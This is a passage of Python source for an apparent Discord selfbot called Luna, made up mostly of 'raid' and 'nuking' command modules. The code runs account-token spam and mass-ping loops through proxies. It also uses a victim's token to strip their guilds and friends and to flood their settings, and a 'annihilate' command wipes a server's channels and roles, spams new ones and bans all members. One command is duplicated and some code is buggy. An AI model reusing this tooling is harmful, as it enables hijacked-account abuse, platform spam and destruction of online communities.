			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "proxyspam",
					usage="<channel_id> <amount> <message>",
					description = "Spam")
	async def proxyspam(self, luna, channel_id:str, amount:int, *, message:str):
		await luna.message.delete()
		if riskmode() == "on":

			tokens = open('data/tokens.txt', 'r')
			proxies = open('data/proxies.txt', 'r')
			
			proxylist = []
			
			for p, _proxy in enumerate(proxies):
				proxy = _proxy.split('\n')[0]
				proxylist.append(proxy)

			tokens = open('data/tokens.txt', 'r')
			for _token in tokens:
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						for i in range(0, amount):
							await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{message}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
							printevent(f"{_token} sent {message}")
				except Exception:
					printerror(f"{_token} failed to send {message}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "raidmassping",
					usage="<channel_id> <delay> <amount>",
					description = "Massping")
	async def raidmassping(self, luna, channel_id:str, delay:int, amount:int):
		await luna.message.delete()
		tokenposition = 0
		if riskmode() == "on":
			try:
				for i in range(amount):
					members = [m.mention for m in luna.guild.members]
					if len(members) < 30:
						mentionamount = len(members)
					else:
						mentionamount = 30
					sendamount = len(members) - mentionamount
					for i in range(sendamount):
						if mentionamount == 0:
							break
						pingtext = ""
						for i in range(mentionamount):
							pingtext += members.pop()

						tokens = open('data/tokens.txt', 'r')
						for _token in tokens:
							_token = _token.split('\n')
							_token = _token[tokenposition]
						try:
							async with httpx.AsyncClient() as client:
								for i in range(0, amount):
									await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{pingtext}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
									printevent(f"{_token} masspinged")
						except Exception:
							printerror(f"{_token} failed to massping")
							pass
						tokenposition += 1
						await asyncio.sleep(delay)
						if len(members) < 10:
							mentionamount = len(members)
						else:
							mentionamount = 10
						sendamount = len(members) - mentionamount
			except Exception as e:
				printerror(f"{e}")
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "raidmassping",
					usage="<channel_id> <delay> <amount>",
					description = "Massping")
	async def raidmassping(self, luna, channel_id:str, delay:int, amount:int):
		await luna.message.delete()
		tokenposition = 0
		if riskmode() == "on":
			try:
				for i in range(amount):
					members = [m.mention for m in luna.guild.members]
					if len(members) < 30:
						mentionamount = len(members)
					else:
						mentionamount = 30
					sendamount = len(members) - mentionamount
					for i in range(sendamount):
						if mentionamount == 0:
							break
						pingtext = ""
						for i in range(mentionamount):
							pingtext += members.pop()

						tokens = open('data/tokens.txt', 'r')
						for _token in tokens:
							_token = _token.split('\n')
							_token = _token[tokenposition]
						try:
							async with httpx.AsyncClient() as client:
								for i in range(0, amount):
									await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{pingtext}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
									printevent(f"{_token} masspinged")
						except Exception:
							printerror(f"{_token} failed to massping")
							pass
						tokenposition += 1
						await asyncio.sleep(delay)
						if len(members) < 10:
							mentionamount = len(members)
						else:
							mentionamount = 10
						sendamount = len(members) - mentionamount
			except Exception as e:
				printerror(f"{e}")
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "raidleave",
					usage="<server_id>",
					description = "Leave the tokens")
	async def raidleave(self, luna, server_id:str):
		await luna.message.delete()
		if riskmode() == "on":

			tokens = open('data/tokens.txt', 'r')
			for _token in tokens:
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						await client.delete(f'https://canary.discord.com/api/v8/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
						printevent(f"{_token} left {server_id}")
				except Exception:
					printerror(f"{_token} failed to leave {server_id}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "proxyleave",
					usage="<server_id>",
					description = "Leave the tokens")
	async def proxyleave(self, luna, server_id:str):
		await luna.message.delete()
		if riskmode() == "on":

			tokens = open('data/tokens.txt', 'r')
			proxies = open('data/proxies.txt', 'r')
			
			proxylist = []
			
			for p, _proxy in enumerate(proxies):
				proxy = _proxy.split('\n')[0]
				proxylist.append(proxy)

			for _token in tokens:
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						await client.delete(f'https://canary.discord.com/api/v8/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
						printevent(f"[PROXY] {_token} left {server_id}")
				except Exception:
					printerror(f"[PROXY] {_token} failed to leave {server_id}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "raidreact",
					usage="<channel_id> <message_id> <emoji>",
					description = "Raid react on a message")
	async def raidreact(self, luna, channel_id: str, message_id: str, emoji: str):
		await luna.message.delete()
		if riskmode() == "on":
			tokens = open('data/tokens.txt', 'r')
			for _token in tokens:
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						await client.put(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
						printevent(f"{_token} reacted on {message_id}")
				except Exception:
					printerror(f"{_token} failed to react on {message_id}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "proxyreact",
					usage="<channel_id> <message_id> <emoji>",
					description = "Raid react on a message")
	async def proxyreact(self, luna, channel_id: str, message_id: str, emoji: str):
		await luna.message.delete()
		if riskmode() == "on":
			tokens = open('data/tokens.txt', 'r')
			proxies = open('data/proxies.txt', 'r')
			
			proxylist = []
			
			for p, _proxy in enumerate(proxies):
				proxy = _proxy.split('\n')[0]
				proxylist.append(proxy)

			for _token in tokens:
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						await client.put(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
						printevent(f"{_token} reacted on {message_id}")
				except Exception:
					printerror(f"{_token} failed to react on {message_id}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

bot.add_cog(RaidCog(bot))

start = datetime.now()

class NukingCog(commands.Cog, name="Nuking commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "nuketoken",
					usage="<token>",
					description = "Nuke the token")
	async def nuketoken(self, luna, token:str):
		await luna.message.delete()
		if riskmode() == "on":
			try:
				guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
				for guild in range(0, len(guilds)):
					guild_id = guilds[guild]['id']
					requests.delete(f'https://canary.discordapp.com/api/v8/users/@me/guilds/{guild_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
				friends = requests.get('https://canary.discordapp.com/api/v8/users/@me/relationships', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
				for friend in range(0, len(friends)):
					friend_id = friends[friend]['id']
					requests.put(f'https://canary.discordapp.com/api/v8/users/@me/relationships/{friend_id}', json={'type': 2}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
					requests.delete(f'https://canary.discordapp.com/api/v8/channels/{friend_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
			except Exception:
				pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "fucktoken",
					usage="<token>",
					description = "Fuck up the token")
	async def fucktoken(self, luna, token:str):
		await luna.message.delete()
		if riskmode() == "on":
			payload = {
				'theme': "light",
				'locale': "ja",
				'message_display_compact': False,
				'inline_embed_media': False,
				'inline_attachment_media': False,
				'gif_auto_play': False,
				'render_embeds': False,
				'render_reactions': False,
				'animate_emoji': False,
				'convert_emoticons': False,
				'enable_tts_command': False,
				'explicit_content_filter': '0',
				'status': "invisible"
			}
			
			requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
			try:
				while True:
					async with httpx.AsyncClient() as client:
						await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "light"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
						await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "dark"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
			except Exception:
				return
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
        
	@commands.command(name = "massban",
					usage="<guild_id>",
					description = "Massban a guild")
	@has_permissions(ban_members=True)
	async def massban(self, luna, guild_id:int):
		await luna.message.delete()
		if riskmode() == "on":
			guild_id = int(guild_id)
			guildhit = self.bot.get_guild(guild_id)
			members = guildhit.members
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for member in members:
				if member is not luna.author:
					try:
						count = count + 1
						await member.ban()
						printmessage(f"Banned » {bcolors.COMMANDVAR}{member}{bcolors.RESET}")
					except Exception:
						printerror(f"Failed to ban » {bcolors.COMMANDVAR}{member}{bcolors.RESET}")
			printmessage(f"Finished banning in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "masskick",
					usage="<guild_id>",
					description = "Masskick a guild")
	@has_permissions(kick_members=True)
	async def masskick(self, luna, guild_id:int):
		await luna.message.delete()
		if riskmode() == "on":
			guild_id = int(guild_id)
			guildhit = self.bot.get_guild(guild_id)
			members = guildhit.members
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for member in members:
				if member is not luna.author:
					try:
						count = count + 1
						await member.kick()
						printmessage(f"Kicked » {bcolors.COMMANDVAR}{member}{bcolors.RESET}")
					except Exception:
						printerror(f"Failed to kick » {bcolors.COMMANDVAR}{member}{bcolors.RESET}")
			printmessage(f"Finished kicking in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "masschannels",
					usage="<guild_id> <amount> <name>",
					description = "Mass create channels")
	@has_permissions(manage_channels=True)
	async def masschannels(self, luna, guild_id:int, amount:int, *, name:str):
		await luna.message.delete()
		if riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for i in range(0, amount):
				try:
					await guildhit.create_text_channel(name=f"{name}")
					printmessage(f"Created channel » {bcolors.COMMANDVAR}{name}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to create channel » {bcolors.COMMANDVAR}{name}{bcolors.RESET}")
			printmessage(f"Finished creating channels in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "massroles",
					usage="<guild_id> <amount> <name>",
					description = "Mass create roles")
	@has_permissions(manage_roles=True)
	async def massroles(self, luna, guild_id:int, amount:int, *, name:str):
		await luna.message.delete()
		if riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for i in range(0, amount):
				try:
					await guildhit.create_roles(name=f"{name}")
					printmessage(f"Created role » {bcolors.COMMANDVAR}{name}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to create role » {bcolors.COMMANDVAR}{name}{bcolors.RESET}")
			printmessage(f"Finished creating roles in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "massdelchannels",
					usage="<guild_id>",
					description = "Mass delete channels")
	@has_permissions(manage_channels=True)
	async def massdelchannels(self, luna, guild_id:int):
		await luna.message.delete()
		if riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			channels = guildhit.channels
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for channel in channels:
				try:
					await channel.delete()
					printmessage(f"Deleted channel » {bcolors.COMMANDVAR}{channel}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to delete channel » {bcolors.COMMANDVAR}{channel}{bcolors.RESET}")
			printmessage(f"Finished deleting channels in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "massdelroles",
					usage="<guild_id>",
					description = "Mass delete roles")
	@has_permissions(manage_roles=True)
	async def massdelroles(self, luna, guild_id:int):
		await luna.message.delete()
		if riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			roles = guildhit.roles
			roles.pop(0)
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for role in roles:
				try:
					await role.delete()
					printmessage(f"Deleted role » {bcolors.COMMANDVAR}{role}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to delete role » {bcolors.COMMANDVAR}{role}{bcolors.RESET}")
			printmessage(f"Finished deleting roles in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "annihilate",
					aliases=['destroy', 'wipe', 'nukeserver'],
					usage="<guild_id> <channel_name> <role_name>",
					description = "Totally annihilate a guild")
	@has_permissions(manage_roles=True, manage_channels=True, ban_members=True)
	async def annihilate(self, luna, guild_id:int, channel_name:str, role_name:str):
		await luna.message.delete()
		if riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			roles = guildhit.roles
			roles.pop(0)
			amount = 50
			members = guildhit.members
			channels = guildhit.channels
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for channel in channels:
				try:
					await channel.delete()
					printmessage(f"Deleted channel » {bcolors.COMMANDVAR}{channel}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to delete channel » {bcolors.COMMANDVAR}{channel}{bcolors.RESET}")
			printmessage(f"Finished deleting channels in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
			for role in roles:
				try:
					await role.delete()
					printmessage(f"Deleted role » {bcolors.COMMANDVAR}{role}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to delete role » {bcolors.COMMANDVAR}{role}{bcolors.RESET}")
			printmessage(f"Finished deleting roles in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
			for i in range(0, amount):
				try:
					await guildhit.create_text_channel(name=f"{channel_name}")
					printmessage(f"Created channel » {bcolors.COMMANDVAR}{channel_name}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to create channel » {bcolors.COMMANDVAR}{channel_name}{bcolors.RESET}")
			printmessage(f"Finished creating channels in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
			for i in range(0, amount):
				try:
					await guildhit.create_roles(name=f"{role_name}")
					printmessage(f"Created role » {bcolors.COMMANDVAR}{role_name}{bcolors.RESET}")
				except Exception:
					printerror(f"Failed to create role » {bcolors.COMMANDVAR}{role_name}{bcolors.RESET}")
			printmessage(f"Finished creating roles in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
			for member in members:
				if member is not luna.author:
					try:
						count = count + 1
						await member.ban()
						printmessage(f"Banned {bcolors.COMMANDVAR}{member}{bcolors.RESET}")
					except Exception:
						printerror(f"Failed to ban » {bcolors.COMMANDVAR}{member}{bcolors.RESET}")
			printmessage(f"Finished banning in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
			printmessage(f"Finished annihilating in » {bcolors.COMMANDVAR}{elapsed}{bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

bot.add_cog(NukingCog(bot))
class PrivacyCog(commands.Cog, name="Privacy commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "privacy",
					aliases=['streamermode'],
					usage="<on/off>",
					description = "Privacy mode")
	async def privacy(self, luna, mode:str):
		await luna.message.delete()

		with open("config.json") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		global privacy

		if mode == "on":
			privacy = True
			printmessage(f"Privacy mode » {purple('on')}")

			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nPrivacy mode » on```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

			clear()
			title(f"Luna | {lunaversion} | Privacy Mode")
			print(purpleblue(logo))
			print(f"                           {purple('[')}+{purple('] CONNECTED')} | {purple('Privacy Mode')}")
			print(f"                           {purple('[')}+{purple(']')} Luna#0000 | {purple('0')} Servers | {purple('0')} Friends")
			print(f"                           {purple('[')}+{purple(']')} {prefix}\n")
			print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
			commandcount = len(bot.commands)
			printmessage(f"{motd} {commandcount} commands.")

		elif mode == "off":
			privacy = False
			printmessage(f"Privacy mode » {purple('off')}")

			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nPrivacy mode » off```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

			clear()
			title(f"Luna | {lunaversion}")
			print(purpleblue(logo))
			print(f"                           {purple('[')}+{purple('] CONNECTED')}")
			print(f"                           {purple('[')}+{purple(']')} {bot.user} | {purple(f'{len(bot.guilds)}')} Servers | {purple(f'{len(bot.user.friends)}')} Friends")
			print(f"                           {purple('[')}+{purple(']')} {prefix}\n")
			print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
			commandcount = len(bot.commands)
			printmessage(f"{motd} {commandcount} commands.")

		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nThat mode does not exist!\nOnly on or off```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

bot.add_cog(PrivacyCog(bot))

class ProtectionCog(commands.Cog, name="Protection commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "antiraid",
					usage="",
					description = "Protects against raids")
	async def antiraid(self, luna):
		await luna.message.delete()

		global antiraid

		if antiraid == False:
			antiraid = True
			printmessage(f"Antiraid: {purple('on')}")

			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nAntiraid » on```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

		elif antiraid == True:
			antiraid = False
			printmessage(f"Antiraid: {purple('off')}")

			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nAntiraid » off```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

bot.add_cog(ProtectionCog(bot))
class BackupsCog(commands.Cog, name="Backup commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "friendsbackup",
					usage="",
					description = "Backup your friendslist")
	async def friendsbackup(self, luna):
		await luna.message.delete()
		printevent("Backing up friendslist...")
		friendsamount = 0
		blockedamount = 0
		friendslist = ""
		blockedlist = ""
		for friend in self.bot.user.friends:
			friendslist += f"{friend.name}#{friend.discriminator}\n"
			friendsamount += 1
		file = open("data/backup/friends.txt", "w", encoding='utf-8') 
		file.write(friendslist)
		file.close()
		for block in self.bot.user.blocked:
			blockedlist += f"{block.name}#{block.discriminator}\n"
			blockedamount += 1
		file = open("data/backup/blocked.txt", "w", encoding='utf-8') 
		file.write(blockedlist)
		file.close()

		embed = discord.Embed(title="Friends Backup", description=f"```\nBacked up {friendsamount} friends in data/backup/friends.txt\n``````\nBacked up {blockedamount} blocked users in data/backup/blocked.txt```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

bot.add_cog(BackupsCog(bot))
class WhitelistCog(commands.Cog, name="Whitelist commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "whitelist",
					usage="<@member>",
					description = "Whitelist someone")
	async def whitelist(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user is None:
			await luna.send("Please specify a user to whitelist")
		else:
			if luna.guild.id not in whitelisted_users.keys():
				whitelisted_users[luna.guild.id] = {}
			if user.id in whitelisted_users[luna.guild.id]:
				await luna.send('That user is already whitelisted')
			else:
				whitelisted_users[luna.guild.id][user.id] = 0
				await luna.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_", "\_") + "#" + user.discriminator + "**")

	@commands.command(name = "unwhitelist",
					usage="",
					description = "Unwhitelist someone")
	async def unwhitelist(self, luna, user: discord.Member = None):
		await luna.message.delete()
		if user is None:
			await luna.send("Please specify the user you would like to unwhitelist")
		else:
			if luna.guild.id not in whitelisted_users.keys():
				await luna.send("That user is not whitelisted")
				return
			if user.id in whitelisted_users[luna.guild.id]:
				whitelisted_users[luna.guild.id].pop(user.id, 0)
				user2 = self.bot.get_user(user.id)
				await luna.send(
					'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',"\_") + '#' + user2.discriminator + '**')

	@commands.command(name = "whitelisted",
					usage="",
					description = "Show the whitelisted list")
	async def whitelisted(self, luna, g=None):
		await luna.message.delete()
		if g == '-g' or g == '-global':
			whitelist = '`All Whitelisted Users:`\n'
			for key in whitelisted_users:
				for key2 in whitelisted_users[key]:
					user = self.bot.get_user(key2)
					whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "#" + user.discriminator + "** - " + self.bot.get_guild(key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
			await luna.send(whitelist)
		else:
			whitelist = "`" + luna.guild.name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + '\'s Whitelisted Users:`\n'
			for key in self.bot.whitelisted_users:
				if key == luna.guild.id:
					for key2 in self.bot.whitelisted_users[luna.guild.id]:
						user = self.bot.get_user(key2)
						whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "#" + user.discriminator + " (" + str(user.id) + ")" + "**\n"
			await luna.send(whitelist)

	@commands.command(name = "clearwhitelist",
					usage="",
					description = "Clear the whitelisted list")
	async def clearwhitelist(self, luna):
		await luna.message.delete()
		whitelisted_users.clear()
		embed = discord.Embed(title="Whitelist", url=titleurlvar(), description="Successfully cleared the whitelist", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

bot.add_cog(WhitelistCog(bot))
class SettingsCog(commands.Cog, name="Settings commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "prefix",
					usage="<prefix>",
					description = "Change the prefix")
	async def prefix(self, luna, newprefix):
		await luna.message.delete()

		config_prefix(newprefix)
		command_count = len(bot.commands)
		cog = bot.get_cog('Custom commands')
		custom = cog.get_commands()
		custom_command_count = 0
		for command in custom:
			custom_command_count += 1
		with open("config.json") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		clear()
		title(f"Luna | {lunaversion}")
		print(purpleblue(logo))
